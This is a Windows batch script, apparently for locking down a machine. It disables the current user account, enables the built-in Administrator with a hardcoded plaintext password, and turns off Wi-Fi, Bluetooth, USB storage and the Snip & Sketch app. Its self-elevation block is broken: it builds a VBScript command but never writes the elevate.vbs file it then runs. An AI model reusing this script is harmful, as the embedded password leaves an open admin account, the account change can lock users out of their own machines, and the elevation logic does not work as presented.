@echo off
set "batchPath=%~0"
setlocal DisableDelayedExpansion

:: Check if running with administrative privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :runScript
) else (
    echo Running script with administrative privileges...
    echo Please provide the necessary permissions.
    echo.
    pause
    echo.
    cd /d "%~dp0"
    set "vbsCmd=Set UAC = CreateObject^("Shell.Application"^): UAC.ShellExecute "%batchPath%", "", "", "runas", 1: set UAC = Nothing"
    cmd /c "%temp%\elevate.vbs" //NOLOGO
    exit
)

:runScript
:: Disable current user and enable administrator user with password
net user %username% /active:no
net user Administrator $treamland@2023 /active:yes

::Disable Snip and sketch
powershell -Command "get-appxpackage *ScreenSketch* | remove-appxpackage"

:: Disable Wi-Fi
netsh interface set interface name="Wi-Fi" admin=disabled

:: Disable Bluetooth
netsh interface set interface name="Bluetooth Network Connection" admin=disabled

:: Disable USB Storage
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d 4 /f

:: Enable Windows Defender
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0 /f


echo Configuration changes applied successfully.
pause
